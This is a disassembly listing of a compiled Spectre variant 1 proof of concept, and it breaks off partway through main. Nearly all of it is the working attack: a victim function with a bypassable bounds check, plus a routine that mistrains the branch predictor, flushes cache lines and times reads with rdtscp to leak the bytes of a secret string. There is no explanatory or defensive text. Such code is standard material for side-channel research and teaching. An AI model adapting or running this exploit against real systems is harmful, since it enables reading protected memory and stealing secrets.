
spectrev1:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    1004:	48 83 ec 08          	sub    $0x8,%rsp
    1008:	48 8b 05 d9 2f 00 00 	mov    0x2fd9(%rip),%rax        # 3fe8 <__gmon_start__@Base>
    100f:	48 85 c0             	test   %rax,%rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   *%rax
    1016:	48 83 c4 08          	add    $0x8,%rsp
    101a:	c3                   	ret    

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:	ff 35 7a 2f 00 00    	push   0x2f7a(%rip)        # 3fa0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	f2 ff 25 7b 2f 00 00 	bnd jmp *0x2f7b(%rip)        # 3fa8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:	0f 1f 00             	nopl   (%rax)
    1030:	f3 0f 1e fa          	endbr64 
    1034:	68 00 00 00 00       	push   $0x0
    1039:	f2 e9 e1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    103f:	90                   	nop
    1040:	f3 0f 1e fa          	endbr64 
    1044:	68 01 00 00 00       	push   $0x1
    1049:	f2 e9 d1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    104f:	90                   	nop
    1050:	f3 0f 1e fa          	endbr64 
    1054:	68 02 00 00 00       	push   $0x2
    1059:	f2 e9 c1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    105f:	90                   	nop
    1060:	f3 0f 1e fa          	endbr64 
    1064:	68 03 00 00 00       	push   $0x3
    1069:	f2 e9 b1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    106f:	90                   	nop
    1070:	f3 0f 1e fa          	endbr64 
    1074:	68 04 00 00 00       	push   $0x4
    1079:	f2 e9 a1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    107f:	90                   	nop

Disassembly of section .plt.got:

0000000000001080 <__cxa_finalize@plt>:
    1080:	f3 0f 1e fa          	endbr64 
    1084:	f2 ff 25 6d 2f 00 00 	bnd jmp *0x2f6d(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    108b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

Disassembly of section .plt.sec:

0000000000001090 <puts@plt>:
    1090:	f3 0f 1e fa          	endbr64 
    1094:	f2 ff 25 15 2f 00 00 	bnd jmp *0x2f15(%rip)        # 3fb0 <puts@GLIBC_2.2.5>
    109b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000010a0 <strlen@plt>:
    10a0:	f3 0f 1e fa          	endbr64 
    10a4:	f2 ff 25 0d 2f 00 00 	bnd jmp *0x2f0d(%rip)        # 3fb8 <strlen@GLIBC_2.2.5>
    10ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000010b0 <__stack_chk_fail@plt>:
    10b0:	f3 0f 1e fa          	endbr64 
    10b4:	f2 ff 25 05 2f 00 00 	bnd jmp *0x2f05(%rip)        # 3fc0 <__stack_chk_fail@GLIBC_2.4>
    10bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000010c0 <printf@plt>:
    10c0:	f3 0f 1e fa          	endbr64 
    10c4:	f2 ff 25 fd 2e 00 00 	bnd jmp *0x2efd(%rip)        # 3fc8 <printf@GLIBC_2.2.5>
    10cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000010d0 <__isoc99_sscanf@plt>:
    10d0:	f3 0f 1e fa          	endbr64 
    10d4:	f2 ff 25 f5 2e 00 00 	bnd jmp *0x2ef5(%rip)        # 3fd0 <__isoc99_sscanf@GLIBC_2.7>
    10db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

Disassembly of section .text:

00000000000010e0 <_start>:
    10e0:	f3 0f 1e fa          	endbr64 
    10e4:	31 ed                	xor    %ebp,%ebp
    10e6:	49 89 d1             	mov    %rdx,%r9
    10e9:	5e                   	pop    %rsi
    10ea:	48 89 e2             	mov    %rsp,%rdx
    10ed:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    10f1:	50                   	push   %rax
    10f2:	54                   	push   %rsp
    10f3:	45 31 c0             	xor    %r8d,%r8d
    10f6:	31 c9                	xor    %ecx,%ecx
    10f8:	48 8d 3d 27 05 00 00 	lea    0x527(%rip),%rdi        # 1626 <main>
    10ff:	ff 15 d3 2e 00 00    	call   *0x2ed3(%rip)        # 3fd8 <__libc_start_main@GLIBC_2.34>
    1105:	f4                   	hlt    
    1106:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    110d:	00 00 00 

0000000000001110 <deregister_tm_clones>:
    1110:	48 8d 3d d1 2f 00 00 	lea    0x2fd1(%rip),%rdi        # 40e8 <__TMC_END__>
    1117:	48 8d 05 ca 2f 00 00 	lea    0x2fca(%rip),%rax        # 40e8 <__TMC_END__>
    111e:	48 39 f8             	cmp    %rdi,%rax
    1121:	74 15                	je     1138 <deregister_tm_clones+0x28>
    1123:	48 8b 05 b6 2e 00 00 	mov    0x2eb6(%rip),%rax        # 3fe0 <_ITM_deregisterTMCloneTable@Base>
    112a:	48 85 c0             	test   %rax,%rax
    112d:	74 09                	je     1138 <deregister_tm_clones+0x28>
    112f:	ff e0                	jmp    *%rax
    1131:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    1138:	c3                   	ret    
    1139:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001140 <register_tm_clones>:
    1140:	48 8d 3d a1 2f 00 00 	lea    0x2fa1(%rip),%rdi        # 40e8 <__TMC_END__>
    1147:	48 8d 35 9a 2f 00 00 	lea    0x2f9a(%rip),%rsi        # 40e8 <__TMC_END__>
    114e:	48 29 fe             	sub    %rdi,%rsi
    1151:	48 89 f0             	mov    %rsi,%rax
    1154:	48 c1 ee 3f          	shr    $0x3f,%rsi
    1158:	48 c1 f8 03          	sar    $0x3,%rax
    115c:	48 01 c6             	add    %rax,%rsi
    115f:	48 d1 fe             	sar    %rsi
    1162:	74 14                	je     1178 <register_tm_clones+0x38>
    1164:	48 8b 05 85 2e 00 00 	mov    0x2e85(%rip),%rax        # 3ff0 <_ITM_registerTMCloneTable@Base>
    116b:	48 85 c0             	test   %rax,%rax
    116e:	74 08                	je     1178 <register_tm_clones+0x38>
    1170:	ff e0                	jmp    *%rax
    1172:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    1178:	c3                   	ret    
    1179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001180 <__do_global_dtors_aux>:
    1180:	f3 0f 1e fa          	endbr64 
    1184:	80 3d 75 2f 00 00 00 	cmpb   $0x0,0x2f75(%rip)        # 4100 <completed.0>
    118b:	75 2b                	jne    11b8 <__do_global_dtors_aux+0x38>
    118d:	55                   	push   %rbp
    118e:	48 83 3d 62 2e 00 00 	cmpq   $0x0,0x2e62(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1195:	00 
    1196:	48 89 e5             	mov    %rsp,%rbp
    1199:	74 0c                	je     11a7 <__do_global_dtors_aux+0x27>
    119b:	48 8b 3d 66 2e 00 00 	mov    0x2e66(%rip),%rdi        # 4008 <__dso_handle>
    11a2:	e8 d9 fe ff ff       	call   1080 <__cxa_finalize@plt>
    11a7:	e8 64 ff ff ff       	call   1110 <deregister_tm_clones>
    11ac:	c6 05 4d 2f 00 00 01 	movb   $0x1,0x2f4d(%rip)        # 4100 <completed.0>
    11b3:	5d                   	pop    %rbp
    11b4:	c3                   	ret    
    11b5:	0f 1f 00             	nopl   (%rax)
    11b8:	c3                   	ret    
    11b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000011c0 <frame_dummy>:
    11c0:	f3 0f 1e fa          	endbr64 
    11c4:	e9 77 ff ff ff       	jmp    1140 <register_tm_clones>

00000000000011c9 <victim_function>:
    11c9:	f3 0f 1e fa          	endbr64 
    11cd:	55                   	push   %rbp
    11ce:	48 89 e5             	mov    %rsp,%rbp
    11d1:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    11d5:	8b 05 45 2e 00 00    	mov    0x2e45(%rip),%eax        # 4020 <array1_size>
    11db:	89 c0                	mov    %eax,%eax
    11dd:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
    11e1:	73 33                	jae    1216 <victim_function+0x4d>
    11e3:	48 8d 15 56 2e 00 00 	lea    0x2e56(%rip),%rdx        # 4040 <array1>
    11ea:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11ee:	48 01 d0             	add    %rdx,%rax
    11f1:	0f b6 00             	movzbl (%rax),%eax
    11f4:	0f b6 c0             	movzbl %al,%eax
    11f7:	c1 e0 09             	shl    $0x9,%eax
    11fa:	48 98                	cltq   
    11fc:	48 8d 15 9d 2f 00 00 	lea    0x2f9d(%rip),%rdx        # 41a0 <flush_reload_buffer>
    1203:	0f b6 14 10          	movzbl (%rax,%rdx,1),%edx
    1207:	0f b6 05 92 2f 02 00 	movzbl 0x22f92(%rip),%eax        # 241a0 <temp>
    120e:	21 d0                	and    %edx,%eax
    1210:	88 05 8a 2f 02 00    	mov    %al,0x22f8a(%rip)        # 241a0 <temp>
    1216:	90                   	nop
    1217:	5d                   	pop    %rbp
    1218:	c3                   	ret    

0000000000001219 <readMemoryByte>:
    1219:	f3 0f 1e fa          	endbr64 
    121d:	55                   	push   %rbp
    121e:	48 89 e5             	mov    %rsp,%rbp
    1221:	41 54                	push   %r12
    1223:	53                   	push   %rbx
    1224:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
    1228:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
    122c:	48 89 75 80          	mov    %rsi,-0x80(%rbp)
    1230:	48 89 95 78 ff ff ff 	mov    %rdx,-0x88(%rbp)
    1237:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    123e:	00 00 
    1240:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    1244:	31 c0                	xor    %eax,%eax
    1246:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%rbp)
    124d:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    1254:	eb 1f                	jmp    1275 <readMemoryByte+0x5c>
    1256:	8b 45 a0             	mov    -0x60(%rbp),%eax
    1259:	48 98                	cltq   
    125b:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1262:	00 
    1263:	48 8d 05 56 2f 02 00 	lea    0x22f56(%rip),%rax        # 241c0 <results.0>
    126a:	c7 04 02 00 00 00 00 	movl   $0x0,(%rdx,%rax,1)
    1271:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
    1275:	81 7d a0 ff 00 00 00 	cmpl   $0xff,-0x60(%rbp)
    127c:	7e d8                	jle    1256 <readMemoryByte+0x3d>
    127e:	c7 45 9c e7 03 00 00 	movl   $0x3e7,-0x64(%rbp)
    1285:	e9 05 03 00 00       	jmp    158f <readMemoryByte+0x376>
    128a:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    1291:	eb 22                	jmp    12b5 <readMemoryByte+0x9c>
    1293:	8b 45 a0             	mov    -0x60(%rbp),%eax
    1296:	c1 e0 09             	shl    $0x9,%eax
    1299:	48 98                	cltq   
    129b:	48 8d 15 fe 2e 00 00 	lea    0x2efe(%rip),%rdx        # 41a0 <flush_reload_buffer>
    12a2:	48 01 d0             	add    %rdx,%rax
    12a5:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    12a9:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    12ad:	0f ae 38             	clflush (%rax)
    12b0:	90                   	nop
    12b1:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
    12b5:	81 7d a0 ff 00 00 00 	cmpl   $0xff,-0x60(%rbp)
    12bc:	7e d5                	jle    1293 <readMemoryByte+0x7a>
    12be:	8b 45 9c             	mov    -0x64(%rbp),%eax
    12c1:	8b 0d 59 2d 00 00    	mov    0x2d59(%rip),%ecx        # 4020 <array1_size>
    12c7:	ba 00 00 00 00       	mov    $0x0,%edx
    12cc:	f7 f1                	div    %ecx
    12ce:	89 d0                	mov    %edx,%eax
    12d0:	89 c0                	mov    %eax,%eax
    12d2:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    12d6:	c7 45 a4 1d 00 00 00 	movl   $0x1d,-0x5c(%rbp)
    12dd:	e9 93 00 00 00       	jmp    1375 <readMemoryByte+0x15c>
    12e2:	48 8d 05 37 2d 00 00 	lea    0x2d37(%rip),%rax        # 4020 <array1_size>
    12e9:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    12ed:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    12f1:	0f ae 38             	clflush (%rax)
    12f4:	90                   	nop
    12f5:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%rbp)
    12fc:	eb 09                	jmp    1307 <readMemoryByte+0xee>
    12fe:	8b 45 98             	mov    -0x68(%rbp),%eax
    1301:	83 c0 01             	add    $0x1,%eax
    1304:	89 45 98             	mov    %eax,-0x68(%rbp)
    1307:	8b 45 98             	mov    -0x68(%rbp),%eax
    130a:	83 f8 63             	cmp    $0x63,%eax
    130d:	7e ef                	jle    12fe <readMemoryByte+0xe5>
    130f:	0f ae f0             	mfence 
    1312:	8b 4d a4             	mov    -0x5c(%rbp),%ecx
    1315:	48 63 c1             	movslq %ecx,%rax
    1318:	48 69 c0 ab aa aa 2a 	imul   $0x2aaaaaab,%rax,%rax
    131f:	48 c1 e8 20          	shr    $0x20,%rax
    1323:	89 ce                	mov    %ecx,%esi
    1325:	c1 fe 1f             	sar    $0x1f,%esi
    1328:	89 c2                	mov    %eax,%edx
    132a:	29 f2                	sub    %esi,%edx
    132c:	89 d0                	mov    %edx,%eax
    132e:	01 c0                	add    %eax,%eax
    1330:	01 d0                	add    %edx,%eax
    1332:	01 c0                	add    %eax,%eax
    1334:	29 c1                	sub    %eax,%ecx
    1336:	89 ca                	mov    %ecx,%edx
    1338:	8d 42 ff             	lea    -0x1(%rdx),%eax
    133b:	66 b8 00 00          	mov    $0x0,%ax
    133f:	48 98                	cltq   
    1341:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1345:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1349:	48 c1 e8 10          	shr    $0x10,%rax
    134d:	48 09 45 c0          	or     %rax,-0x40(%rbp)
    1351:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    1355:	48 33 45 b0          	xor    -0x50(%rbp),%rax
    1359:	48 23 45 c0          	and    -0x40(%rbp),%rax
    135d:	48 33 45 b0          	xor    -0x50(%rbp),%rax
    1361:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1365:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1369:	48 89 c7             	mov    %rax,%rdi
    136c:	e8 58 fe ff ff       	call   11c9 <victim_function>
    1371:	83 6d a4 01          	subl   $0x1,-0x5c(%rbp)
    1375:	83 7d a4 00          	cmpl   $0x0,-0x5c(%rbp)
    1379:	0f 89 63 ff ff ff    	jns    12e2 <readMemoryByte+0xc9>
    137f:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    1386:	e9 d6 00 00 00       	jmp    1461 <readMemoryByte+0x248>
    138b:	8b 45 a0             	mov    -0x60(%rbp),%eax
    138e:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
    1394:	83 c0 0d             	add    $0xd,%eax
    1397:	25 ff 00 00 00       	and    $0xff,%eax
    139c:	89 45 ac             	mov    %eax,-0x54(%rbp)
    139f:	8b 45 ac             	mov    -0x54(%rbp),%eax
    13a2:	c1 e0 09             	shl    $0x9,%eax
    13a5:	48 98                	cltq   
    13a7:	48 8d 15 f2 2d 00 00 	lea    0x2df2(%rip),%rdx        # 41a0 <flush_reload_buffer>
    13ae:	48 01 d0             	add    %rdx,%rax
    13b1:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    13b5:	48 8d 45 94          	lea    -0x6c(%rbp),%rax
    13b9:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    13bd:	0f 01 f9             	rdtscp 
    13c0:	89 ce                	mov    %ecx,%esi
    13c2:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    13c6:	89 31                	mov    %esi,(%rcx)
    13c8:	48 c1 e2 20          	shl    $0x20,%rdx
    13cc:	48 09 d0             	or     %rdx,%rax
    13cf:	49 89 c4             	mov    %rax,%r12
    13d2:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    13d6:	0f b6 00             	movzbl (%rax),%eax
    13d9:	0f b6 c0             	movzbl %al,%eax
    13dc:	89 45 94             	mov    %eax,-0x6c(%rbp)
    13df:	48 8d 45 94          	lea    -0x6c(%rbp),%rax
    13e3:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    13e7:	0f 01 f9             	rdtscp 
    13ea:	89 ce                	mov    %ecx,%esi
    13ec:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    13f0:	89 31                	mov    %esi,(%rcx)
    13f2:	48 c1 e2 20          	shl    $0x20,%rdx
    13f6:	48 09 d0             	or     %rdx,%rax
    13f9:	4c 29 e0             	sub    %r12,%rax
    13fc:	48 89 c3             	mov    %rax,%rbx
    13ff:	48 83 fb 50          	cmp    $0x50,%rbx
    1403:	77 58                	ja     145d <readMemoryByte+0x244>
    1405:	8b 45 9c             	mov    -0x64(%rbp),%eax
    1408:	8b 0d 12 2c 00 00    	mov    0x2c12(%rip),%ecx        # 4020 <array1_size>
    140e:	ba 00 00 00 00       	mov    $0x0,%edx
    1413:	f7 f1                	div    %ecx
    1415:	89 d0                	mov    %edx,%eax
    1417:	89 c2                	mov    %eax,%edx
    1419:	48 8d 05 20 2c 00 00 	lea    0x2c20(%rip),%rax        # 4040 <array1>
    1420:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
    1424:	0f b6 c0             	movzbl %al,%eax
    1427:	39 45 ac             	cmp    %eax,-0x54(%rbp)
    142a:	74 31                	je     145d <readMemoryByte+0x244>
    142c:	8b 45 ac             	mov    -0x54(%rbp),%eax
    142f:	48 98                	cltq   
    1431:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1438:	00 
    1439:	48 8d 05 80 2d 02 00 	lea    0x22d80(%rip),%rax        # 241c0 <results.0>
    1440:	8b 04 02             	mov    (%rdx,%rax,1),%eax
    1443:	8d 48 01             	lea    0x1(%rax),%ecx
    1446:	8b 45 ac             	mov    -0x54(%rbp),%eax
    1449:	48 98                	cltq   
    144b:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1452:	00 
    1453:	48 8d 05 66 2d 02 00 	lea    0x22d66(%rip),%rax        # 241c0 <results.0>
    145a:	89 0c 02             	mov    %ecx,(%rdx,%rax,1)
    145d:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
    1461:	81 7d a0 ff 00 00 00 	cmpl   $0xff,-0x60(%rbp)
    1468:	0f 8e 1d ff ff ff    	jle    138b <readMemoryByte+0x172>
    146e:	c7 45 a8 ff ff ff ff 	movl   $0xffffffff,-0x58(%rbp)
    1475:	8b 45 a8             	mov    -0x58(%rbp),%eax
    1478:	89 45 a4             	mov    %eax,-0x5c(%rbp)
    147b:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%rbp)
    1482:	e9 88 00 00 00       	jmp    150f <readMemoryByte+0x2f6>
    1487:	83 7d a4 00          	cmpl   $0x0,-0x5c(%rbp)
    148b:	78 32                	js     14bf <readMemoryByte+0x2a6>
    148d:	8b 45 a0             	mov    -0x60(%rbp),%eax
    1490:	48 98                	cltq   
    1492:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1499:	00 
    149a:	48 8d 05 1f 2d 02 00 	lea    0x22d1f(%rip),%rax        # 241c0 <results.0>
    14a1:	8b 14 02             	mov    (%rdx,%rax,1),%edx
    14a4:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    14a7:	48 98                	cltq   
    14a9:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
    14b0:	00 
    14b1:	48 8d 05 08 2d 02 00 	lea    0x22d08(%rip),%rax        # 241c0 <results.0>
    14b8:	8b 04 01             	mov    (%rcx,%rax,1),%eax
    14bb:	39 c2                	cmp    %eax,%edx
    14bd:	7c 0e                	jl     14cd <readMemoryByte+0x2b4>
    14bf:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    14c2:	89 45 a8             	mov    %eax,-0x58(%rbp)
    14c5:	8b 45 a0             	mov    -0x60(%rbp),%eax
    14c8:	89 45 a4             	mov    %eax,-0x5c(%rbp)
    14cb:	eb 3e                	jmp    150b <readMemoryByte+0x2f2>
    14cd:	83 7d a8 00          	cmpl   $0x0,-0x58(%rbp)
    14d1:	78 32                	js     1505 <readMemoryByte+0x2ec>
    14d3:	8b 45 a0             	mov    -0x60(%rbp),%eax
    14d6:	48 98                	cltq   
    14d8:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    14df:	00 
    14e0:	48 8d 05 d9 2c 02 00 	lea    0x22cd9(%rip),%rax        # 241c0 <results.0>
    14e7:	8b 14 02             	mov    (%rdx,%rax,1),%edx
    14ea:	8b 45 a8             	mov    -0x58(%rbp),%eax
    14ed:	48 98                	cltq   
    14ef:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
    14f6:	00 
    14f7:	48 8d 05 c2 2c 02 00 	lea    0x22cc2(%rip),%rax        # 241c0 <results.0>
    14fe:	8b 04 01             	mov    (%rcx,%rax,1),%eax
    1501:	39 c2                	cmp    %eax,%edx
    1503:	7c 06                	jl     150b <readMemoryByte+0x2f2>
    1505:	8b 45 a0             	mov    -0x60(%rbp),%eax
    1508:	89 45 a8             	mov    %eax,-0x58(%rbp)
    150b:	83 45 a0 01          	addl   $0x1,-0x60(%rbp)
    150f:	81 7d a0 ff 00 00 00 	cmpl   $0xff,-0x60(%rbp)
    1516:	0f 8e 6b ff ff ff    	jle    1487 <readMemoryByte+0x26e>
    151c:	8b 45 a8             	mov    -0x58(%rbp),%eax
    151f:	48 98                	cltq   
    1521:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1528:	00 
    1529:	48 8d 05 90 2c 02 00 	lea    0x22c90(%rip),%rax        # 241c0 <results.0>
    1530:	8b 04 02             	mov    (%rdx,%rax,1),%eax
    1533:	83 c0 02             	add    $0x2,%eax
    1536:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
    1539:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    153c:	48 98                	cltq   
    153e:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1545:	00 
    1546:	48 8d 05 73 2c 02 00 	lea    0x22c73(%rip),%rax        # 241c0 <results.0>
    154d:	8b 04 02             	mov    (%rdx,%rax,1),%eax
    1550:	39 c1                	cmp    %eax,%ecx
    1552:	7c 45                	jl     1599 <readMemoryByte+0x380>
    1554:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    1557:	48 98                	cltq   
    1559:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1560:	00 
    1561:	48 8d 05 58 2c 02 00 	lea    0x22c58(%rip),%rax        # 241c0 <results.0>
    1568:	8b 04 02             	mov    (%rdx,%rax,1),%eax
    156b:	83 f8 02             	cmp    $0x2,%eax
    156e:	75 1b                	jne    158b <readMemoryByte+0x372>
    1570:	8b 45 a8             	mov    -0x58(%rbp),%eax
    1573:	48 98                	cltq   
    1575:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    157c:	00 
    157d:	48 8d 05 3c 2c 02 00 	lea    0x22c3c(%rip),%rax        # 241c0 <results.0>
    1584:	8b 04 02             	mov    (%rdx,%rax,1),%eax
    1587:	85 c0                	test   %eax,%eax
    1589:	74 0e                	je     1599 <readMemoryByte+0x380>
    158b:	83 6d 9c 01          	subl   $0x1,-0x64(%rbp)
    158f:	83 7d 9c 00          	cmpl   $0x0,-0x64(%rbp)
    1593:	0f 8f f1 fc ff ff    	jg     128a <readMemoryByte+0x71>
    1599:	8b 05 21 2c 02 00    	mov    0x22c21(%rip),%eax        # 241c0 <results.0>
    159f:	89 c2                	mov    %eax,%edx
    15a1:	8b 45 94             	mov    -0x6c(%rbp),%eax
    15a4:	31 d0                	xor    %edx,%eax
    15a6:	89 05 14 2c 02 00    	mov    %eax,0x22c14(%rip)        # 241c0 <results.0>
    15ac:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    15af:	89 c2                	mov    %eax,%edx
    15b1:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    15b5:	88 10                	mov    %dl,(%rax)
    15b7:	8b 45 a4             	mov    -0x5c(%rbp),%eax
    15ba:	48 98                	cltq   
    15bc:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    15c3:	00 
    15c4:	48 8d 05 f5 2b 02 00 	lea    0x22bf5(%rip),%rax        # 241c0 <results.0>
    15cb:	8b 14 02             	mov    (%rdx,%rax,1),%edx
    15ce:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
    15d5:	89 10                	mov    %edx,(%rax)
    15d7:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    15db:	48 83 c0 01          	add    $0x1,%rax
    15df:	8b 55 a8             	mov    -0x58(%rbp),%edx
    15e2:	88 10                	mov    %dl,(%rax)
    15e4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
    15eb:	48 8d 50 04          	lea    0x4(%rax),%rdx
    15ef:	8b 45 a8             	mov    -0x58(%rbp),%eax
    15f2:	48 98                	cltq   
    15f4:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
    15fb:	00 
    15fc:	48 8d 05 bd 2b 02 00 	lea    0x22bbd(%rip),%rax        # 241c0 <results.0>
    1603:	8b 04 01             	mov    (%rcx,%rax,1),%eax
    1606:	89 02                	mov    %eax,(%rdx)
    1608:	90                   	nop
    1609:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    160d:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
    1614:	00 00 
    1616:	74 05                	je     161d <readMemoryByte+0x404>
    1618:	e8 93 fa ff ff       	call   10b0 <__stack_chk_fail@plt>
    161d:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
    1621:	5b                   	pop    %rbx
    1622:	41 5c                	pop    %r12
    1624:	5d                   	pop    %rbp
    1625:	c3                   	ret    

0000000000001626 <main>:
    1626:	f3 0f 1e fa          	endbr64 
    162a:	55                   	push   %rbp
    162b:	48 89 e5             	mov    %rsp,%rbp
    162e:	48 83 ec 40          	sub    $0x40,%rsp
    1632:	89 7d cc             	mov    %edi,-0x34(%rbp)
    1635:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
    1639:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    1640:	00 00 
    1642:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1646:	31 c0                	xor    %eax,%eax
    1648:	48 8d 05 cf 09 00 00 	lea    0x9cf(%rip),%rax        # 201e <_IO_stdin_used+0x1e>
    164f:	48 89 c7             	mov    %rax,%rdi
    1652:	e8 39 fa ff ff       	call   1090 <puts@plt>
    1657:	48 8b 15 82 2a 00 00 	mov    0x2a82(%rip),%rdx        # 40e0 <secret>
    165e:	48 8b 05 7b 2a 00 00 	mov    0x2a7b(%rip),%rax        # 40e0 <secret>
    1665:	48 89 c6             	mov    %rax,%rsi
    1668:	48 8d 05 c1 09 00 00 	lea    0x9c1(%rip),%rax        # 2030 <_IO_stdin_used+0x30>
    166f:	48 89 c7             	mov    %rax,%rdi
    1672:	b8 00 00 00 00       	mov    $0x0,%eax
    1677:	e8 44 fa ff ff       	call   10c0 <printf@plt>
    167c:	48 8b 05 5d 2a 00 00 	mov    0x2a5d(%rip),%rax        # 40e0 <secret>
    1683:	48 8d 15 b6 29 00 00 	lea    0x29b6(%rip),%rdx        # 4040 <array1>
    168a:	48 29 d0             	sub    %rdx,%rax
    168d:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    1691:	48 8b 05 48 2a 00 00 	mov    0x2a48(%rip),%rax        # 40e0 <secret>
    1698:	48 89 c7             	mov    %rax,%rdi
    169b:	e8 00 fa ff ff       	call   10a0 <strlen@plt>
    16a0:	89 45 d4             	mov    %eax,-0x2c(%rbp)
    16a3:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
    16aa:	00 
    16ab:	eb 16                	jmp    16c3 <main+0x9d>
    16ad:	48 8d 15 ec 2a 00 00 	lea    0x2aec(%rip),%rdx        # 41a0 <flush_reload_buffer>
    16b4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16b8:	48 01 d0             	add    %rdx,%rax
    16bb:	c6 00 01             	movb   $0x1,(%rax)
    16be:	48 83 45 e0 01       	addq   $0x1,-0x20(%rbp)
    16c3:	48 81 7d e0 ff ff 01 	cmpq   $0x1ffff,-0x20(%rbp)
    16ca:	00 
    16cb:	76 e0                	jbe    16ad <main+0x87>
    16cd:	83 7d cc 03          	cmpl   $0x3,-0x34(%rbp)
    16d1:	0f 85 81 00 00 00    	jne    1758 <main+0x132>
    16d7:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    16db:	48 83 c0 08          	add    $0x8,%rax
    16df:	48 8b 00             	mov    (%rax),%rax
    16e2:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
    16e6:	48 8d 0d 8b 09 00 00 	lea    0x98b(%rip),%rcx        # 2078 <_IO_stdin_used+0x78>
    16ed:	48 89 ce             	mov    %rcx,%rsi
    16f0:	48 89 c7             	mov    %rax,%rdi
